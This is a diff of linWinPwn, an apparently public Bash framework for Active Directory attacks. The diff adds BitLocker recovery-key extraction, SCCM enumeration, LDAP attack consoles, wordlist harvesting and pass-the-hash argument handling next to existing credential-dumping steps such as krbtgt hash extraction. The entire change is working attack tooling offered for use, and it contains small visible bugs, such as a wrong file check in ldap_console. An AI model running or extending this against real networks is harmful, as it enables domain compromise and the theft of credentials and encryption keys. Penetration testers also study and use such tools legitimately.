@@ -82,6 +82,13 @@ windapsearch="$scripts_dir/windapsearch"
 CVE202233679="$scripts_dir/CVE-2022-33679.py"
 targetedKerberoast="$scripts_dir/targetedKerberoast.py"
 FindUncommonShares="$scripts_dir/FindUncommonShares.py"
+ExtractBitlockerKeys="$scripts_dir/ExtractBitlockerKeys.py"
+ldapconsole="$scripts_dir/ldapconsole.py"
+pyLDAPmonitor="$scripts_dir/pyLDAPmonitor.py"
+LDAPWordlistHarvester="$scripts_dir/LDAPWordlistHarvester.py"
+rdwatool=$(which rdwatool)
+aced="$scripts_dir/aced-main/aced.py"
+sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
 nmap=$(which nmap)
 john=$(which john)
 
@@ -93,7 +100,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.9.0 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.9.1 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -249,7 +256,7 @@ prepare (){
     mkdir -p ${output_dir}/Vulnerabilities
     mkdir -p ${output_dir}/Vulnerabilities/RPCDump
     mkdir -p ${output_dir}/Vulnerabilities/Coercer
-    mkdir -p /tmp/shared
+    mkdir -p ${output_dir}/ConsoleData
 
     if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
     if [ ! -f ${servers_hostname_list} ]; then /bin/touch  ${servers_hostname_list}; fi
@@ -339,10 +346,12 @@ authenticate (){
         argument_silenthd="-u ${domain}\\${user} -p ''"
         argument_windap="-d ${domain} -u ${user} -p ''"
         argument_targkerb="-d ${domain} -u ${user} -p ''"
-        argument_finduncshar="-d ${domain} -u ${user} -p ''"
+        argument_p0dalirius="-d ${domain} -u ${user} -p ''"
         argument_manspider="-d ${domain} -u ${user} -p ''"
         argument_coercer="-d ${domain} -u ${user} -p ''"
         argument_bloodyad="-d ${domain} -u ${user} -p ''"
+        argument_aced="${domain}/${user}:''"
+        argument_sccm="-d ${domain}"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -372,10 +381,12 @@ authenticate (){
         argument_silenthd="-u ${domain}\\${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
         argument_targkerb="-d ${domain} -u ${user} -p ${password}"
-        argument_finduncshar="-d ${domain} -u ${user} -p ${password}"
+        argument_p0dalirius="-d ${domain} -u ${user} -p ${password}"
         argument_manspider="-d ${domain} -u ${user} -p ${password}"
         argument_coercer="-d ${domain} -u ${user} -p ${password}"
         argument_bloodyad="-d ${domain} -u ${user} -p ${password}"
+        argument_aced="${domain}/${user}:${password}"
+        argument_sccm="-d ${domain} -u ${user} -p ${password}"
         hash_bool=false
         kerb_bool=false
         aeskey_bool=false
@@ -385,6 +396,37 @@ authenticate (){
 
     #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
     if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
+        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
+            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
+                hash="aad3b435b51404eeaad3b435b51404ee"$hash
+            fi
+            argument_ne="-d ${domain} -u ${user} -H ${hash}"
+            argument_imp=" -hashes ${hash} ${domain}/${user}"
+            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
+            argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
+            argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
+            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+            argument_adidns="-u ${domain}\\${user} -p ${hash}"
+            argument_ldd="-u ${domain}\\${user} -p ${hash}"
+            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
+            argument_certi_py="${domain}/${user} --hashes ${hash}"
+            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
+            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
+            argument_donpapi=" -H ${hash} ${domain}/${user}"
+            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
+            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
+            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
+            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
+            argument_p0dalirius="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+            argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+            argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
+            argument_aced=" -hashes ${hash} ${domain}/${user}"
+            argument_sccm="-d ${domain} -u ${user} -hashes ${hash}"
+        else
+            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
+            exit 1
+        fi
         if [ "${cert_bool}" == true ]; then
             echo -e "${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}"
             echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
@@ -401,34 +443,6 @@ authenticate (){
             kerb_bool=false
             aeskey_bool=false
             hash_bool=false
-            if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
-                if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
-                    hash="aad3b435b51404eeaad3b435b51404ee"$hash
-                fi
-                argument_ne="-d ${domain} -u ${user} -H ${hash}"
-                argument_imp=" -hashes ${hash} ${domain}/${user}"
-                argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
-                argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
-                argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
-                argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-                argument_adidns="-u ${domain}\\${user} -p ${hash}"
-                argument_ldd="-u ${domain}\\${user} -p ${hash}"
-                argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
-                argument_certi_py="${domain}/${user} --hashes ${hash}"
-                argument_certipy="-u ${user}@${domain} -hashes ${hash}"
-                argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_donpapi=" -H ${hash} ${domain}/${user}"
-                argument_hekatomb="-hashes ${hash} ${domain}/${user}"
-                argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
-                argument_windap="-d ${domain} -u ${user} --hash ${hash}"
-                argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
-                argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-                argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
-            else
-                echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
-                exit 1
-            fi
         else
             argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
             argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
@@ -464,7 +478,10 @@ authenticate (){
             argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
             argument_donpapi="-k -no-pass ${domain}/${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
+            argument_p0dalirius="-d ${domain} -u ${user} -k --no-pass"
             argument_bloodyad="-d ${domain} -u ${user} -k"
+            argument_aced="-k -no-pass ${domain}/${user}"
+            argument_sccm="-d ${domain} -u ${user} -k --no-pass"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath $krb5cc)${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
@@ -487,6 +504,9 @@ authenticate (){
         argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
         argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
         argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
+        argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
+        argument_aced="-aes ${aeskey} ${domain}/${user}"
+        argument_sccm="-d ${domain} -u ${user} -aes ${aeskey}"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -523,11 +543,12 @@ authenticate (){
         argument_windap="${argument_windap} -v --debug"
         argument_targkerb="${argument_targkerb} -v"
         argument_kerbrute="-v"
-        argument_finduncshar="${argument_finduncshar} -v --debug"
         argument_manspider="${argument_manspider} -v"
         argument_coercer="${argument_coercer} -v"
         argument_CVE202233679="-debug"
         argument_bloodyad="-v DEBUG ${argument_bloodyad}"
+        argument_aced="-debug ${argument_aced}"
+        argument_sccm="-debug ${argument_sccm}"
     fi
     
     echo -e ${auth_string}
@@ -912,21 +933,6 @@ certipy_enum () {
     echo -e ""
 }
 
-certipy_ldapshell () {
-    if [[ ! -f "${certipy}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-    else
-        if [ "${cert_bool}" == true ] ; then
-            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
-            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/DomainRecon/certipy_ldapshell_output_${dc_domain}.txt
-        else
-            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
-        fi
-    fi
-    echo -e ""
-}
-
 fqdn_to_ldap_dn() {
   sed -e 's/[^ ]*/dc=&/g' <<<"${1//./ }" -e 's/ /,/g'
 }
@@ -1205,6 +1211,43 @@ windapsearch_enum () {
     echo -e ""
 }
 
+ldapwordharv_enum () {
+    if [ ! -f "${LDAPWordlistHarvester}" ]; then
+        echo -e "${RED}[-] Please verify the installation of LDAPWordlistHarvester${NC}"
+    else
+        echo -e "${BLUE}[*] Generating wordlist using LDAPWordlistHarvester${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
+        run_command "${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} -o ${output_dir}/DomainRecon/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a ${output_dir}/DomainRecon/ldapwordharv_output_${dc_domain}.txt
+    fi
+    echo -e ""
+}
+
+rdwatool_enum (){
+    if [ ! -f "${rdwatool}" ]; then
+        echo -e "${RED}[-] Please verify the installation of rdwatool${NC}"
+    else
+        echo -e "${BLUE}[*] Enumerating RDWA servers using rdwatool${NC}"
+        run_command "${rdwatool} recon -tf ${servers_hostname_list}" 2>&1 | tee ${output_dir}/DomainRecon/rdwatool_output_${dc_domain}.txt
+    fi
+    echo -e ""
+}
+
+sccm_enum (){
+    if [ ! -f "${sccmhunter}" ]; then
+        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            run_command "$(which python) ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
 ###### Kerberos attacks
 kerbrute_enum () {
     echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
@@ -1466,12 +1509,9 @@ finduncshar_scan () {
         echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
     else
         echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
-        if [ "${hash_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH nor kerberos authentication${NC}"
-        else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
-        fi
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
+        run_command "${FindUncommonShares} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -2096,6 +2136,17 @@ certsync_ntds_dump () {
     echo -e ""
 }
 
+bitlocker_dump () {
+    if [ ! -f "${ExtractBitlockerKeys}" ]; then
+        echo -e "${RED}[-] Please verify the installation of ExtractBitlockerKeys${NC}"
+    else
+        echo -e "${BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys${NC}"
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
+        run_command "${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --dc-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt
+    fi
+    echo -e ""
+}
+
 get_hash_krbtgt (){
     if [ ! -f "${impacket_secretsdump}" ] ; then
         echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
@@ -2110,6 +2161,61 @@ get_hash_krbtgt (){
         fi
         krbtgt_nt=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep krbtgt |grep -v "aes\|des" | cut -d ":" -f 4)
         krbtgt_aes=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
+    fi
+    echo -e ""
+}
+
+###### LDAP Console Tools
+certipy_ldapshell () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        if [ "${cert_bool}" == true ] ; then
+            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/ConsoleData/certipy_ldapshell_output_${dc_domain}.txt
+        else
+            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
+ldap_console () {
+    if [ ! -f "${FindUncommonShares}" ]; then
+        echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
+    else
+        echo -e "${BLUE}[*] Launching ldapconsole${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-debug"; else verbose_p0dalirius=""; fi
+        run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/ConsoleData/ldapconsole_output_${dc_domain}.txt
+    fi
+    echo -e ""
+}
+
+ldap_monitor () {
+    if [ ! -f "${pyLDAPmonitor}" ]; then
+        echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
+    else
+        echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
+        run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip}" 2>&1
+    fi
+    echo -e ""
+}
+
+aced_console (){
+    if [ ! -f "${aced}" ]; then
+        echo -e "${RED}[-] Please verify the installation of aced${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] aced requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Launching aced${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            run_command "$(which python) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/ConsoleData/aced_output_${dc_domain}.txt
+        fi
     fi
     echo -e ""
 }
@@ -2130,6 +2236,9 @@ ad_enum () {
     userpass_ne_check
     pre2k_check
     bloodyad_enum
+    ldapwordharv_enum
+    rdwatool_enum
+    sccm_enum
 }
 
 kerberos () {
@@ -2155,6 +2264,7 @@ pwd_dump () {
     secrets_dump
     lsassy_dump
     dpapi_dump
+    bitlocker_dump
 }
 
 vuln_checks () {
@@ -2306,7 +2416,9 @@ ad_menu() {
     echo -e "14) User=Pass check using netexec (Noisy!)"
     echo -e "15) Pre2k computers authentication check (Noisy!)"
     echo -e "16) bloodyAD Enumeration"
-    echo -e "17) Certipy LDAP shell via Schannel (using Certificate Authentication)"
+    echo -e "17) LDAP Wordlist Harvester"
+    echo -e "18) Enumeration of RDWA servers"
+    echo -e "19) SCCM Enumeration using sccmhunter"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2389,7 +2501,15 @@ ad_menu() {
         ad_menu;;
 
         17)
-        certipy_ldapshell
+        ldapwordharv_enum
+        ad_menu;;
+
+        18)
+        rdwatool_enum
+        ad_menu;;
+
+        19)
+        sccm_enum
         ad_menu;;
 
         99)
@@ -2701,6 +2821,7 @@ pwd_menu () {
     echo -e "18) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
     echo -e "19) Dump Veeam credentials (only from Veeam server)"
     echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
+    echo -e "21) Extract Bitlocker Keys"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2816,6 +2937,11 @@ pwd_menu () {
         pwd_menu
         ;;
 
+        21)
+        bitlocker_dump
+        pwd_menu
+        ;;
+
         99)
         main_menu
         ;;
@@ -2824,6 +2950,51 @@ pwd_menu () {
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
         pwd_menu
+        ;;
+    esac
+}
+
+console_menu () {
+    echo -e ""
+    echo -e "${CYAN}[LDAP console menu]${NC} Please choose from the following options:"
+    echo -e "----------------------------------------------------------------"
+    echo -e "1) Certipy LDAP shell via Schannel (using Certificate Authentication)"
+    echo -e "2) podalirius' LDAP Console"
+    echo -e "3) podalirius's LDAP Monitor"
+    echo -e "4) garrettfoster13's ACED"
+    echo -e "99) Back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        1)
+        certipy_ldapshell
+        console_menu
+        ;;
+
+        2)
+        ldap_console
+        console_menu
+        ;;
+
+        3)
+        ldap_monitor
+        console_menu
+        ;;
+
+        4)
+        aced_console
+        console_menu
+        ;;
+
+        99)
+        main_menu
+        ;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        ad_menu
         ;;
     esac
 }
@@ -3256,9 +3427,21 @@ config_menu () {
         if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
         if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
         if [ ! -f "${FindUncommonShares}" ] ; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
+        if [ ! -x "${FindUncommonShares}" ] ; then echo -e "${RED}[-] FindUncommonShares is not executable${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is executable${NC}"; fi
+        if [ ! -f "${ExtractBitlockerKeys}" ] ; then echo -e "${RED}[-] ExtractBitlockerKeys is not installed${NC}"; else echo -e "${GREEN}[+] ExtractBitlockerKeys is installed${NC}"; fi
+        if [ ! -x "${ExtractBitlockerKeys}" ] ; then echo -e "${RED}[-] ExtractBitlockerKeys is not executable${NC}"; else echo -e "${GREEN}[+] ExtractBitlockerKeys is executable${NC}"; fi
+        if [ ! -f "${ldapconsole}" ] ; then echo -e "${RED}[-] ldapconsole is not installed${NC}"; else echo -e "${GREEN}[+] ldapconsole is installed${NC}"; fi
+        if [ ! -x "${ldapconsole}" ] ; then echo -e "${RED}[-] ldapconsole is not executable${NC}"; else echo -e "${GREEN}[+] ldapconsole is executable${NC}"; fi
+        if [ ! -f "${pyLDAPmonitor}" ] ; then echo -e "${RED}[-] pyLDAPmonitor is not installed${NC}"; else echo -e "${GREEN}[+] pyLDAPmonitor is installed${NC}"; fi
+        if [ ! -x "${pyLDAPmonitor}" ] ; then echo -e "${RED}[-] pyLDAPmonitor is not executable${NC}"; else echo -e "${GREEN}[+] pyLDAPmonitor is executable${NC}"; fi
+        if [ ! -f "${LDAPWordlistHarvester}" ] ; then echo -e "${RED}[-] LDAPWordlistHarvester is not installed${NC}"; else echo -e "${GREEN}[+] LDAPWordlistHarvester is installed${NC}"; fi
+        if [ ! -x "${LDAPWordlistHarvester}" ] ; then echo -e "${RED}[-] LDAPWordlistHarvester is not executable${NC}"; else echo -e "${GREEN}[+] LDAPWordlistHarvester is executable${NC}"; fi
+        if [ ! -f "${rdwatool}" ] ; then echo -e "${RED}[-] rdwatool is not installed${NC}"; else echo -e "${GREEN}[+] rdwatool is installed${NC}"; fi
         if [ ! -f "${manspider}" ] ; then echo -e "${RED}[-] manspider is not installed${NC}"; else echo -e "${GREEN}[+] manspider is installed${NC}"; fi
         if [ ! -f "${coercer}" ] ; then echo -e "${RED}[-] coercer is not installed${NC}"; else echo -e "${GREEN}[+] coercer is installed${NC}"; fi
         if [ ! -f "${bloodyad}" ] ; then echo -e "${RED}[-] bloodyad is not installed${NC}"; else echo -e "${GREEN}[+] bloodyad is installed${NC}"; fi
+        if [ ! -f "${aced}" ] ; then echo -e "${RED}[-] aced is not installed${NC}"; else echo -e "${GREEN}[+] aced is installed${NC}"; fi
+        if [ ! -f "${sccmhunter}" ] ; then echo -e "${RED}[-] sccmhunter is not installed${NC}"; else echo -e "${GREEN}[+] sccmhunter is installed${NC}"; fi
         config_menu
         ;;
 
@@ -3352,6 +3535,7 @@ main_menu () {
     echo -e "5) Vulnerability Checks Menu"
     echo -e "6) Password Dump Menu"
     echo -e "7) Run MSSQL Enumeration"
+    echo -e "8) LDAP Console Menu"
     echo -e "99) Quit"
 
     read -p "> " option_selected </dev/tty
@@ -3386,6 +3570,11 @@ main_menu () {
 
         7)
         mssql_enum
+        main_menu
+        ;;
+
+        8)
+        console_menu
         main_menu
         ;;
 
